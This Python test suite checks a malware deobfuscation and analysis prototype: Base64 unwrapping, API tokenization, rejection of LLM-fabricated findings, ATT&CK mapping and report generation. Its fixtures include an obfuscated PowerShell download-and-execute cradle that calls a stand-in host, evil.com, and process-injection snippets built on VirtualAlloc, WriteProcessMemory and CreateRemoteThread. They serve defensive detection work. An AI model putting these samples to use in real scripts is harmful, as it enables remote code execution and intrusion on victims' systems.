"""
tests.test_prototype
~~~~~~~~~~~~~~~~~~~~
Automated test suite verifying the deobfuscator_engine prototype.
Tests AST unwrapping, tokenization, atomic API preservation, evidence verification, and dossier generation.
"""

import unittest
import base64
import os
import sys
import tempfile
import json
from pathlib import Path

# Ensure project root is in sys.path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from deobfuscator_engine.ingest import Ingestor
from deobfuscator_engine.ast_preprocessor import ASTPreprocessor
from deobfuscator_engine.api_tokenizer import APITokenizer
from deobfuscator_engine.evidence_verifier import EvidenceVerifier
from deobfuscator_engine.mitre_mapper import MitreMapper
from deobfuscator_engine.semantic_engine import SemanticEngine
from deobfuscator_engine.dossier_generator import DossierGenerator

class TestDeobfuscatorEngine(unittest.TestCase):

    def setUp(self):
        self.ingestor = Ingestor()
        self.preprocessor = ASTPreprocessor()
        self.tokenizer = APITokenizer(window_size=2048, overlap=256)
        self.verifier = EvidenceVerifier()
        self.mapper = MitreMapper()
        self.generator = DossierGenerator()

    def test_ingestion_safety_and_hashing(self):
        """Verifies ingestion calculates SHA-256 and enforces non-execution."""
        payload = b"Write-Host 'Test Payload'"
        with tempfile.NamedTemporaryFile(suffix=".ps1", delete=False) as f:
            f.write(payload)
            tmp_path = f.name

        try:
            meta = self.ingestor.ingest_file(tmp_path)
            self.assertIn("powershell", meta["file_type"].lower())
            self.assertTrue(meta["safe_mode"])
            self.assertEqual(len(meta["sha256"]), 64)
            self.assertEqual(len(meta["md5"]), 32)
        finally:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)

    def test_ast_preprocessing_base64_layer(self):
        """Verifies multi-layer Base64 decoding and string un-concatenation."""
        inner_code = "$client = New-Object System.Net.WebClient; $client.DownloadString('http://evil.com/p.ps1')"
        b64_inner = base64.b64encode(inner_code.encode('utf-8')).decode('ascii')
        wrapped_script = f"$enc = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{b64_inner}')); Invoke-Expression $enc"

        result = self.preprocessor.preprocess(wrapped_script)
        self.assertGreaterEqual(result["layers_unwrapped"], 1)
        self.assertIn("DownloadString", result["normalized_code"])
        self.assertIn("http://evil.com/p.ps1", result["normalized_code"])

    def test_ast_string_concatenation_folding(self):
        """Verifies string concatenation folding ('V'+'irt'+'ualAlloc')."""
        obf_concat = "$f = 'Vir' + 'tual' + 'Alloc';"
        result = self.preprocessor.preprocess(obf_concat)
        self.assertIn("VirtualAlloc", result["normalized_code"])

    def test_api_tokenizer_atomic_preservation(self):
        """Verifies Win32 APIs are preserved as indivisible atomic tokens."""
        sample_code = """
        $p = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            [Win32]::VirtualAlloc(0, 0x1000, 0x3000, 0x40)
        );
        WriteProcessMemory($hProcess, $p, $buf, $size, 0);
        CreateRemoteThread($hProcess, 0, 0, $p, 0, 0, 0);
        """
        tok_res = self.tokenizer.process_text(sample_code)
        extracted = tok_res["extracted_apis"]
        self.assertIn("VirtualAlloc", extracted)
        self.assertIn("WriteProcessMemory", extracted)
        self.assertIn("CreateRemoteThread", extracted)

    def test_evidence_verifier_rejects_hallucinations(self):
        """Verifies that APIs fabricated by an LLM are caught and rejected."""
        gt_apis = ["VirtualAlloc", "WriteProcessMemory"]
        candidate_apis = ["VirtualAlloc", "WriteProcessMemory", "CryptEncrypt", "HttpSendRequestW"]
        tokens = ["VirtualAlloc", "(", "0", ")", "WriteProcessMemory", "test"]

        verif_res = self.verifier.verify_findings(candidate_apis, gt_apis, tokens)
        corroborated = [c if isinstance(c, str) else c["api_name"] for c in verif_res["corroborated_apis"]]
        rejected = [r if isinstance(r, str) else r["api_name"] for r in verif_res["rejected_hallucinations"]]

        self.assertIn("VirtualAlloc", corroborated)
        self.assertIn("WriteProcessMemory", corroborated)
        self.assertIn("CryptEncrypt", rejected)
        self.assertIn("HttpSendRequestW", rejected)
        self.assertTrue(verif_res["hallucination_detected"])

    def test_mitre_attack_mapping(self):
        """Verifies deterministic ATT&CK technique mapping."""
        verified_apis = ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]
        sample_code = "CreateRemoteThread(proc, 0, 0, addr, 0, 0, 0)"
        mapping = self.mapper.map_techniques(verified_apis, sample_code)

        self.assertIn("T1055", mapping["primary_techniques"])
        self.assertIn("T1106", mapping["primary_techniques"])
        self.assertGreaterEqual(mapping["technique_count"], 2)

    def test_full_dossier_generation(self):
        """Verifies end-to-end dossier creation on a realistic obfuscated sample."""
        malicious_script = """
        $b64 = "VmlydHVhbEFsbG9jRXgoMCwgMHgxMDAwLCAweDMwMDAsIDB4NDApOyBXcml0ZVByb2Nlc3NNZW1vcnkoKTsgQ3JlYXRlUmVtb3RlVGhyZWFkKCk7";
        $raw = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($b64));
        IEX $raw
        """
        dossier = self.generator.generate_from_code(malicious_script, "sample_injector.ps1")
        self.assertEqual(dossier["forensic_assessment"]["verdict"], "MALICIOUS")
        self.assertGreater(dossier["forensic_assessment"]["confidence_score"], 0.7)
        self.assertIn("T1055", dossier["mitre_attack_attribution"]["primary_techniques"])
        self.assertIn("pipeline_latencies", dossier)
        self.assertGreater(dossier["pipeline_latencies"]["total_wall_clock_sec"], 0.0)

if __name__ == "__main__":
    unittest.main()
